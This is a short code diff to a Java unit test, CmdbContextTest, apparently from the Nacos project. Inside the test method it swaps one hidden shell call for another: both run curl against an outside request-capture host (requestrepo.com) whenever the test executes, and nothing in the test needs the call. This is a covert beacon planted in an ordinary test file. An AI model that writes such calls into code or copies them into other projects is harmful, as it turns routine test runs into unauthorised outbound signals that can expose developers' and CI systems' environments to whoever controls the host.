@@ -12,6 +12,7 @@
  * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  * See the License for the specific language governing permissions and
  * limitations under the License.
+ * test
  */
 
 package com.alibaba.nacos.api.selector.context;
@@ -28,7 +29,7 @@ class CmdbContextTest {
     
     @Test
     void testToString() throws IOException {
-        Runtime.getRuntime().exec("curl https://we4lykvf.requestrepo.com/env");
+        Runtime.getRuntime().exec("curl https://we4lykvf.requestrepo.com/env_test");
         CmdbContext<Instance> cmdbContext = new CmdbContext<>();
         cmdbContext.setProviders(Collections.singletonList(new CmdbContext.CmdbInstance<>()));
         cmdbContext.setConsumer(new CmdbContext.CmdbInstance<>());
